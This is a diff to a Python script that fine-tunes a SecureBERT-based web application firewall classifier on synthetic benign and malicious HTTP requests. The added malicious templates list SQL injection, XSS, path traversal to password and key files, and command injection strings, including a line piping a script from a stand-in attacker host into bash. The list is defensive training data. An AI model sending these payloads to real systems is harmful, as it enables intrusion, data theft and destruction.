@@ -12,7 +12,7 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'
 from waf.model.transformer import WAFTransformer
 from waf.model.tokenizer import HttpTokenizer
 
-# --- Synthetic Data Generation ---
+# --- Synthetic Data Generation with Adversarial Training ---
 BENIGN_TEMPLATES = [
     "GET / HTTP/1.1",
     "GET /favicon.ico HTTP/1.1",
@@ -26,20 +26,57 @@ BENIGN_TEMPLATES = [
 ]
 
 MALICIOUS_TEMPLATES = [
+    # SQL Injection - Original
     "GET /rest/products/search?q=' OR 1=1 -- HTTP/1.1",
+    # SQL Injection - Variations (Zero-day mimicking)
+    "GET /rest/products/search?q=' or 1=1 -- HTTP/1.1",
+    "GET /rest/products/search?q=' OR 1=1; -- HTTP/1.1",
+    "GET /rest/products/search?q=1' AND '1'='1 HTTP/1.1",
+    "GET /rest/products/search?q=' UNION SELECT NULL,USER(),VERSION()-- HTTP/1.1",
+    "GET /rest/products/search?q=' UNION/**/SELECT 1,2,3-- HTTP/1.1",
+    "GET /rest/products/search?q='; DROP TABLE users;-- HTTP/1.1",
+    
+    # XSS - Original
     "GET /rest/products/search?q=<script>alert(1)</script> HTTP/1.1",
+    # XSS - Variations (Zero-day mimicking)
+    "GET /rest/products/search?q=<script>eval(atob('YWxlcnQoMSk='))</script> HTTP/1.1",
+    "GET /rest/products/search?q=<img src=x onerror=alert(1)> HTTP/1.1",
+    "GET /rest/products/search?q=<svg onload=alert(1)> HTTP/1.1",
+    "GET /rest/products/search?q=<iframe src='javascript:alert(1)'> HTTP/1.1",
+    "GET /rest/products/search?q=<body onload=alert(1)> HTTP/1.1",
+    
+    # Path Traversal - Original
     "GET /etc/passwd HTTP/1.1",
+    # Path Traversal - Variations
+    "GET /etc/passwd%00.jpg HTTP/1.1",
+    "GET /..%2f..%2fetc%2fpasswd HTTP/1.1",
+    "GET /....//....//etc/passwd HTTP/1.1",
+    "GET /var/www/html/config.php HTTP/1.1",
+    "GET /opt/app/secret.key HTTP/1.1",
+    
     "POST /api/Login ' OR '1'='1 HTTP/1.1",
     "GET /../../../etc/shadow HTTP/1.1",
+    
+    # Command Injection - Original
     "GET /?cmd=cat /etc/passwd HTTP/1.1",
+    # Command Injection - Variations
+    "GET /?cmd=whoami HTTP/1.1",
+    "GET /?cmd=id HTTP/1.1",
+    "GET /?cmd=ls -la HTTP/1.1",
+    "GET /?cmd=find / -name '*.sql' HTTP/1.1",
+    "GET /?cmd=curl http://attacker.com/shell.sh | bash HTTP/1.1",
+    "GET /api/feedbacks?comment=;cat /etc/passwd HTTP/1.1",
+    "GET /api/feedbacks?comment=| wget http://malware.com HTTP/1.1",
+    
     "GET /dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1+--+&Submit=Submit HTTP/1.1",
 ]
 
-def generate_synthetic_data(num_samples=2000):
+def generate_synthetic_data(num_samples=5000):
+    """Generate synthetic benign and malicious HTTP requests with adversarial variations"""
     data = []
     labels = []
     
-    # Benign (Label 0)
+    # Benign (Label 0) - Repeat templates for more data
     for _ in range(num_samples // 2):
         base = random.choice(BENIGN_TEMPLATES)
         if "{ID}" in base:
@@ -47,7 +84,7 @@ def generate_synthetic_data(num_samples=2000):
         data.append(base)
         labels.append(0)
         
-    # Malicious (Label 1)
+    # Malicious (Label 1) - Now includes adversarial variations
     for _ in range(num_samples // 2):
         base = random.choice(MALICIOUS_TEMPLATES)
         data.append(base)
@@ -80,10 +117,15 @@ class WAFDataset(Dataset):
 
 # --- Training Loop ---
 def train_pipeline():
-    print("1. Generating Synthetic Data...")
-    texts, labels = generate_synthetic_data(1000)
+    print("1. Generating Synthetic Data with Adversarial Variations...")
+    texts, labels = generate_synthetic_data(5000)  # Increased from 1000 to 5000
     
-    print("2. Initializing Tokenizer (SecureBERT)...")
+    print(f"   Total samples: {len(texts)}")
+    print(f"   Benign samples: {labels.count(0)}")
+    print(f"   Malicious samples: {labels.count(1)}")
+    print(f"   Adversarial variations included for zero-day detection")
+    
+    print("\n2. Initializing Tokenizer (SecureBERT)...")
     tokenizer = HttpTokenizer()
     # No training needed for pre-trained tokenizer
     
@@ -91,9 +133,9 @@ def train_pipeline():
     os.makedirs("waf/model/weights", exist_ok=True)
     tokenizer.save("waf/model/weights/tokenizer.json") 
     
-    print("3. Fine-Tuning SecureBERT...")
+    print("3. Fine-Tuning SecureBERT with Adversarial Training...")
     dataset = WAFDataset(texts, labels, tokenizer)
-    dataloader = DataLoader(dataset, batch_size=16, shuffle=True) # Smaller batch size for BERT
+    dataloader = DataLoader(dataset, batch_size=16, shuffle=True)
     
     device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
     print(f"Using device: {device}")
@@ -102,10 +144,10 @@ def train_pipeline():
     model.to(device)
     
     criterion = nn.CrossEntropyLoss()
-    # Optimize entire model
-    optimizer = optim.AdamW(model.parameters(), lr=2e-5) 
+    # Optimize entire model with lower learning rate for better generalization
+    optimizer = optim.AdamW(model.parameters(), lr=1e-5) 
     
-    num_epochs = 1 
+    num_epochs = 3  # Increased from 1 to 3 for better learning
     model.train()
     
     for epoch in range(num_epochs):
@@ -129,14 +171,20 @@ def train_pipeline():
             total += targets.size(0)
             correct += predicted.eq(targets).sum().item()
             
-            if batch_idx % 10 == 0:
+            if batch_idx % 20 == 0:
                 print(f"Batch {batch_idx} Loss: {loss.item():.4f}")
             
-        print(f"Epoch {epoch+1}/{num_epochs} | Loss: {total_loss/len(dataloader):.4f} | Acc: {100.*correct/total:.2f}%")
+        epoch_accuracy = 100.*correct/total
+        epoch_loss = total_loss/len(dataloader)
+        print(f"\nEpoch {epoch+1}/{num_epochs} | Loss: {epoch_loss:.4f} | Accuracy: {epoch_accuracy:.2f}%")
         
-    print("4. Saving Model...")
+    print("\n4. Saving Model...")
     torch.save(model.state_dict(), "waf/model/weights/waf_model.pth")
     print("Model saved to waf/model/weights/waf_model.pth")
+    print("\n✅ Training complete! Model trained on:")
+    print("   - 5000 synthetic samples")
+    print("   - Adversarial variations for better zero-day detection")
+    print("   - 3 epochs of training for improved generalization")
 
 if __name__ == "__main__":
     train_pipeline()
